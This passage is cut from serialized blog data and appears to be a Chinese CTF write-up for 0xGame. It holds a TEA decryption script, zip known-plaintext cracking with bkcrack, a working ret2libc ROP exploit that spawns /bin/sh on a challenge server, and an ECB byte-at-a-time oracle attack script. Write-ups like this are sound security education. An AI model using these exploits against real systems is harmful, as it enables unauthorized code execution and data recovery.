class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>得到flag：<code>0xGame&#123;5ffa9030-e204-4673-b4c6-ed433aca7228&#125;</code></p>\n<h2 id=\"TELF\"><a href=\"#TELF\" class=\"headerlink\" title=\"TELF\"></a>TELF</h2><p>010的使用:在光标处键入数据会<strong>自动往后覆盖</strong>，实现替换。(或者选中某块数据然后开始键入，修改替换掉该块的数据。)注意不要删除，删了之后再键入就是继续往后覆盖数据了。这就不能实现该数据块的替换了，反而替换掉了后面不该替换的数据。<strong>删除不要乱点！</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> struct</span><br><span class=\"line\"><span class=\"keyword\">import</span> ctypes</span><br><span class=\"line\"></span><br><span class=\"line\">libc = ctypes.CDLL(<span class=\"string\">&#x27;libc.so.6&#x27;</span>)  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 定义 srand 和 rand 函数的原型</span></span><br><span class=\"line\">libc.srand.argtypes = [ctypes.c_uint]</span><br><span class=\"line\">libc.srand.restype = <span class=\"literal\">None</span></span><br><span class=\"line\">libc.rand.argtypes = []</span><br><span class=\"line\">libc.rand.restype = ctypes.c_int</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_keys</span>():</span><br><span class=\"line\">    seed = <span class=\"number\">0xF6950</span></span><br><span class=\"line\">    libc.srand(seed)</span><br><span class=\"line\">    keys = [(libc.rand()) <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">4</span>)]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> keys</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">decrypt</span>(<span class=\"params\">v, k</span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    使用 TEA 算法解密一个 64 位的数据块。</span></span><br><span class=\"line\"><span class=\"string\">    v: 一个包含两个 32 位无符号整数的元组 (v0, v1)。</span></span><br><span class=\"line\"><span class=\"string\">    k: 一个包含四个 32 位整数的密钥数组。</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\">    v0, v1 = v</span><br><span class=\"line\">    delta = <span class=\"number\">0x9e3779b9</span></span><br><span class=\"line\">    num_rounds = <span class=\"number\">32</span></span><br><span class=\"line\">    sum_val = (delta * num_rounds) &amp; <span class=\"number\">0xFFFFFFFF</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(num_rounds):</span><br><span class=\"line\">        term1 = ((v0 &lt;&lt; <span class=\"number\">4</span>) + k[<span class=\"number\">2</span>]) &amp; <span class=\"number\">0xFFFFFFFF</span></span><br><span class=\"line\">        term2 = (v0 + sum_val) &amp; <span class=\"number\">0xFFFFFFFF</span></span><br><span class=\"line\">        term3 = ((v0 &gt;&gt; <span class=\"number\">5</span>) + k[<span class=\"number\">3</span>]) &amp; <span class=\"number\">0xFFFFFFFF</span></span><br><span class=\"line\">        v1 = (v1 - (term1 ^ term2 ^ term3)) &amp; <span class=\"number\">0xFFFFFFFF</span></span><br><span class=\"line\">        term1 = ((v1 &lt;&lt; <span class=\"number\">4</span>) + k[<span class=\"number\">0</span>]) &amp; <span class=\"number\">0xFFFFFFFF</span></span><br><span class=\"line\">        term2 = (v1 + sum_val) &amp; <span class=\"number\">0xFFFFFFFF</span></span><br><span class=\"line\">        term3 = ((v1 &gt;&gt; <span class=\"number\">5</span>) + k[<span class=\"number\">1</span>]) &amp; <span class=\"number\">0xFFFFFFFF</span></span><br><span class=\"line\">        v0 = (v0 - (term1 ^ term2 ^ term3)) &amp; <span class=\"number\">0xFFFFFFFF</span></span><br><span class=\"line\">        sum_val = (sum_val - delta) &amp; <span class=\"number\">0xFFFFFFFF</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> v0, v1</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">main</span>():</span><br><span class=\"line\">    enc = <span class=\"built_in\">bytes</span>([</span><br><span class=\"line\">        <span class=\"number\">0xAD</span>, <span class=\"number\">0xDA</span>, <span class=\"number\">0x01</span>, <span class=\"number\">0xDC</span>, <span class=\"number\">0xAE</span>, <span class=\"number\">0x5B</span>, <span class=\"number\">0x8A</span>, <span class=\"number\">0x08</span>,</span><br><span class=\"line\">        <span class=\"number\">0x4E</span>, <span class=\"number\">0xF5</span>, <span class=\"number\">0x4F</span>, <span class=\"number\">0x8F</span>, <span class=\"number\">0x6E</span>, <span class=\"number\">0x5F</span>, <span class=\"number\">0x9D</span>, <span class=\"number\">0x9E</span>,</span><br><span class=\"line\">        <span class=\"number\">0x0A</span>, <span class=\"number\">0x4E</span>, <span class=\"number\">0xA9</span>, <span class=\"number\">0x08</span>, <span class=\"number\">0x25</span>, <span class=\"number\">0xAB</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0xC2</span>,</span><br><span class=\"line\">        <span class=\"number\">0x4B</span>, <span class=\"number\">0xC9</span>, <span class=\"number\">0x8F</span>, <span class=\"number\">0x43</span>, <span class=\"number\">0x3D</span>, <span class=\"number\">0x51</span>, <span class=\"number\">0xD6</span>, <span class=\"number\">0x28</span>,</span><br><span class=\"line\">        <span class=\"number\">0xF6</span>, <span class=\"number\">0x72</span>, <span class=\"number\">0xCD</span>, <span class=\"number\">0xF4</span>, <span class=\"number\">0x2B</span>, <span class=\"number\">0xB4</span>, <span class=\"number\">0x4A</span>, <span class=\"number\">0x3B</span>,</span><br><span class=\"line\">        <span class=\"number\">0xFB</span>, <span class=\"number\">0x36</span>, <span class=\"number\">0x66</span>, <span class=\"number\">0xEF</span>, <span class=\"number\">0xD6</span>, <span class=\"number\">0x8A</span>, <span class=\"number\">0x8C</span>, <span class=\"number\">0xB2</span>,</span><br><span class=\"line\">        <span class=\"number\">0xEB</span>, <span class=\"number\">0x1A</span>, <span class=\"number\">0x9C</span>, <span class=\"number\">0x1B</span>, <span class=\"number\">0x0A</span>, <span class=\"number\">0x9C</span>, <span class=\"number\">0x1F</span>, <span class=\"number\">0x53</span></span><br><span class=\"line\">    ])</span><br><span class=\"line\">    keys = get_keys()</span><br><span class=\"line\"></span><br><span class=\"line\">    decrypted_flag = <span class=\"string\">b&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"built_in\">len</span>(enc), <span class=\"number\">8</span>):</span><br><span class=\"line\">        chunk = enc[i:i+<span class=\"number\">8</span>]</span><br><span class=\"line\">        v = struct.unpack(<span class=\"string\">&#x27;&lt;2I&#x27;</span>, chunk)</span><br><span class=\"line\">        decrypted_v = decrypt(v, keys)</span><br><span class=\"line\">        decrypted_chunk = struct.pack(<span class=\"string\">&#x27;&lt;2I&#x27;</span>, decrypted_v[<span class=\"number\">0</span>], decrypted_v[<span class=\"number\">1</span>])</span><br><span class=\"line\">        decrypted_flag += decrypted_chunk</span><br><span class=\"line\">        flag_str = decrypted_flag.decode(<span class=\"string\">&#x27;utf-8&#x27;</span>).rstrip(<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;&#123;&#123;flag_str&#125;&#125;&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n<p>首先是upx脱壳，但是upx标签被修改成了X1c，用010替换X1c为UPX然后就能脱壳了，脱完之后就能逆向了,得到:</p>\n<p><code>0xGame&#123;PANDORA-PANRADOXXX-101AP-9CDE02B83F5D6-7B1A9C348&#125;</code>  flag .</p>\n<h1 id=\"Misc\"><a href=\"#Misc\" class=\"headerlink\" title=\"Misc\"></a>Misc</h1><h2 id=\"明文攻击\"><a href=\"#明文攻击\" class=\"headerlink\" title=\"明文攻击\"></a>明文攻击</h2><ul>\n<li><p>先构造一个png文件，，bkcrack只需要12个字节的明文就能爆破，<code>89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52</code>，文件头是这个。</p>\n</li>\n<li><p>运行<code>bkcrack.exe -C attachment.zip -c huiliyi.png -p 01.png</code>，爆破得到<code>cdc564be 5675041f 719adb56</code>密钥。</p>\n</li>\n<li><p>最后<code>bkcrack.exe -C attachment.zip -c flag.txt -k cdc564be 5675041f 719adb56 -d flag_decrypted.txt</code>得到flag</p>\n</li>\n<li><p><code>0xGame&#123;Y0u_cRacked_M3!z1p_1s_uNsafe!&#125;</code></p>\n</li>\n</ul>\n","excerpt":"","more":"<h1 id=\"pwn\"><a href=\"#pwn\" class=\"headerlink\" title=\"pwn\"></a>pwn</h1><h2 id=\"ret2libc\"><a href=\"#ret2libc\" class=\"headerlink\" title=\"ret2libc\"></a>ret2libc</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">io=remote(<span class=\"string\">&quot;nc1.ctfplus.cn&quot;</span>,<span class=\"number\">30264</span>)</span><br><span class=\"line\">main=<span class=\"number\">0x40122D</span></span><br><span class=\"line\">got=<span class=\"number\">0x404018</span></span><br><span class=\"line\">plt=<span class=\"number\">0x401070</span></span><br><span class=\"line\">rdi=<span class=\"number\">0x40119e</span></span><br><span class=\"line\">ret=<span class=\"number\">0x40122c</span></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;Input something: \\n&quot;</span>)</span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x48</span>+p64(rdi)+p64(got)+p64(plt)+p64(main)</span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&#x27;./libc.so.6&#x27;</span>)</span><br><span class=\"line\">base=u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))-libc.sym.puts</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(base))</span><br><span class=\"line\">sym=libc.sym.system+base</span><br><span class=\"line\">sh=<span class=\"built_in\">next</span>(libc.search(<span class=\"string\">&quot;/bin/sh&quot;</span>))+base</span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x48</span>+p64(ret)+p64(rdi)+p64(sh)+p64(sym)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;Input something: \\n&quot;</span>)</span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>先把libc的基址找出来，然后再构造ROP链。</p>\n<h2 id=\"多线程\"><a href=\"#多线程\" class=\"headerlink\" title=\"多线程\"></a>多线程</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">io=remote(<span class=\"string\">&quot;nc1.ctfplus.cn&quot;</span>,<span class=\"number\">32640</span>)</span><br><span class=\"line\">io.sendline(<span class=\"string\">b&quot;a&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0x40</span>):</span><br><span class=\"line\">    io.sendline(<span class=\"string\">b&quot;2&quot;</span>)</span><br><span class=\"line\">io.sendline(<span class=\"string\">b&quot;3&quot;</span>)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>得到<code>0xGame&#123;Thr3@ds_c@nn0t_b3_w1th0ut_l0cks&#125;</code></p>\n<h2 id=\"高数😫😫\"><a href=\"#高数😫😫\" class=\"headerlink\" title=\"高数😫😫\"></a>高数😫😫</h2><p><img src=\"/images/wp/eval.png\" alt=\"eval\"></p>\n<p>这个<strong>条件</strong>和<strong>循环</strong>结构够我学一辈子😭😭</p>\n<p>flag：<code>0xGame&#123;Ur_@n_excel1ent_bl@ster&#125;</code></p>\n<h1 id=\"Crypto\"><a href=\"#Crypto\" class=\"headerlink\" title=\"Crypto\"></a>Crypto</h1><h2 id=\"Orcale\"><a href=\"#Orcale\" class=\"headerlink\" title=\"Orcale\"></a>Orcale</h2><p>爆破</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># --- 连接信息 ---</span></span><br><span class=\"line\">HOST = <span class=\"string\">&#x27;nc1.ctfplus.cn&#x27;</span></span><br><span class=\"line\">PORT = <span class=\"number\">49725</span></span><br><span class=\"line\">BLOCK_SIZE = <span class=\"number\">16</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># --- I/O 辅助函数 ---</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">recv_until</span>(<span class=\"params\">s, delim</span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;从 socket 中接收数据，直到遇到指定的分隔符 delim。&quot;&quot;&quot;</span></span><br><span class=\"line\">    data = <span class=\"string\">b&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"keyword\">not</span> data.endswith(delim):</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            chunk = s.recv(<span class=\"number\">1</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> chunk:  <span class=\"comment\"># 连接已关闭</span></span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\">            data += chunk</span><br><span class=\"line\">        <span class=\"keyword\">except</span> socket.timeout:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[-] Socket timeout.&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> data</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_encryption</span>(<span class=\"params\">s, payload_hex</span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    在一个已建立的 socket 连接上，发送一次加密请求并获取结果。</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"comment\"># 1. 回答 &#x27;y&#x27; 继续加密</span></span><br><span class=\"line\">        s.sendall(<span class=\"string\">b&#x27;y\\n&#x27;</span>)</span><br><span class=\"line\">        recv_until(s, <span class=\"string\">b&#x27;[-] Plaintext(in hex):&#x27;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 2. 发送我们的 payload</span></span><br><span class=\"line\">        s.sendall(payload_hex.encode() + <span class=\"string\">b&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 3. 解析返回的密文</span></span><br><span class=\"line\">        recv_until(s, <span class=\"string\">b&#x27;[+] Ciphertext: &#x27;</span>)</span><br><span class=\"line\">        response_line = recv_until(s, <span class=\"string\">b&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> response_line:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> response_line.strip().decode()</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> (socket.error, BrokenPipeError):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[-] Network error occurred during communication.&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># --- 主攻击逻辑 ---</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">solve</span>():</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    执行 ECB 逐字节攻击的主函数。</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"comment\"># 建立一个持久连接</span></span><br><span class=\"line\">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">    s.settimeout(<span class=\"number\">5</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        s.connect((HOST, PORT))</span><br><span class=\"line\">        <span class=\"comment\"># 清理掉第一个 &quot;Continue?&quot; 提示</span></span><br><span class=\"line\">        recv_until(s, <span class=\"string\">b&#x27;y/[n])?&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> socket.error <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[-] Failed to connect to <span class=\"subst\">&#123;HOST&#125;</span>:<span class=\"subst\">&#123;PORT&#125;</span>. Error: <span class=\"subst\">&#123;e&#125;</span>&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br><span class=\"line\">    known_flag = <span class=\"string\">b&#x27;0xGame&#123;&#x27;</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[*] Starting ECB byte-at-a-time attack with known prefix: <span class=\"subst\">&#123;known_flag.decode()&#125;</span>&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;-&quot;</span> * <span class=\"number\">50</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"keyword\">not</span> known_flag.endswith(<span class=\"string\">b&#x27;&#125;&#x27;</span>):</span><br><span class=\"line\">            <span class=\"comment\"># 1. 对齐步骤 (Alignment)</span></span><br><span class=\"line\">            <span class=\"comment\"># 构造填充物 (padding)，其长度能让下一个未知字节恰好落在16字节块的末尾</span></span><br><span class=\"line\">            <span class=\"comment\"># 例如，当 known_flag 长度为7时, 我们需要 15-7=8 个 &#x27;A&#x27;</span></span><br><span class=\"line\">            padding_len = (BLOCK_SIZE - <span class=\"number\">1</span>) - (<span class=\"built_in\">len</span>(known_flag) % BLOCK_SIZE)</span><br><span class=\"line\">            padding = <span class=\"string\">b&#x27;A&#x27;</span> * padding_len</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"comment\"># 发送这个对齐用的 payload，获取目标密文</span></span><br><span class=\"line\">            <span class=\"comment\"># 服务器会加密: pad(padding + flag, 16)</span></span><br><span class=\"line\">            response_hex = get_encryption(s, padding.<span class=\"built_in\">hex</span>())</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> response_hex:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[-] Failed to get response from oracle during alignment.&quot;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"comment\"># 我们感兴趣的密文块，是包含第一个未知字节的那一块</span></span><br><span class=\"line\">            <span class=\"comment\"># 它的索引可以通过 (padding长度 + 已知flag长度) / 16 来计算</span></span><br><span class=\"line\">            target_block_index = (<span class=\"built_in\">len</span>(padding) + <span class=\"built_in\">len</span>(known_flag)) // BLOCK_SIZE</span><br><span class=\"line\">            start_pos = target_block_index * BLOCK_SIZE * <span class=\"number\">2</span>  <span class=\"comment\"># 1字节=2个hex字符</span></span><br><span class=\"line\">            end_pos = start_pos + (BLOCK_SIZE * <span class=\"number\">2</span>)</span><br><span class=\"line\">            target_block = response_hex[start_pos:end_pos]</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\"># 2. 爆破步骤 (Brute-force)</span></span><br><span class=\"line\">            found_char = <span class=\"literal\">False</span></span><br><span class=\"line\">            <span class=\"comment\"># 优先尝试常见的 flag 字符集</span></span><br><span class=\"line\">            charset = (string.ascii_letters + string.digits + <span class=\"string\">&quot;_-!&#123;&#125;?@#$&quot;</span>).encode(<span class=\"string\">&#x27;latin-1&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">for</span> char_code <span class=\"keyword\">in</span> charset:</span><br><span class=\"line\">                guess_char = <span class=\"built_in\">bytes</span>([char_code])</span><br><span class=\"line\">                </span><br><span class=\"line\">                <span class=\"comment\"># 构造测试 payload: padding + known_flag + guess</span></span><br><span class=\"line\">                <span class=\"comment\"># 服务器会加密: pad(padding + known_flag + guess + rest_of_flag, 16)</span></span><br><span class=\"line\">                <span class=\"comment\"># 这个构造使得 (padding + known_flag + guess) 组成一个或多个完整的块</span></span><br><span class=\"line\">                test_payload = padding + known_flag + guess_char</span><br><span class=\"line\">                </span><br><span class=\"line\">                test_response_hex = get_encryption(s, test_payload.<span class=\"built_in\">hex</span>())</span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> test_response_hex:</span><br><span class=\"line\">                    <span class=\"comment\"># 如果单次请求失败，跳过这个字符，避免程序崩溃</span></span><br><span class=\"line\">                    <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\"># 提取相同位置的密文块进行比较</span></span><br><span class=\"line\">                test_block = test_response_hex[start_pos:end_pos]</span><br><span class=\"line\">                </span><br><span class=\"line\">                <span class=\"keyword\">if</span> test_block == target_block:</span><br><span class=\"line\">                    known_flag += guess_char</span><br><span class=\"line\">                    <span class=\"comment\"># 使用 &#x27;ignore&#x27; 以避免非UTF-8字符打印时出错</span></span><br><span class=\"line\">                    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] Found: &#x27;<span class=\"subst\">&#123;guess_char.decode(<span class=\"string\">&#x27;latin-1&#x27;</span>, <span class=\"string\">&#x27;ignore&#x27;</span>)&#125;</span>&#x27;  -&gt;  Flag: <span class=\"subst\">&#123;known_flag.decode(<span class=\"string\">&#x27;latin-1&#x27;</span>, <span class=\"string\">&#x27;ignore&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class=\"line\">                    found_char = <span class=\"literal\">True</span></span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> found_char:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n[-] Attack failed. Could not find the next character in the charset.&quot;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">finally</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;-&quot;</span> * <span class=\"number\">50</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> known_flag.endswith(<span class=\"string\">b&#x27;&#125;&#x27;</span>):</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[!] Success! Full flag found: 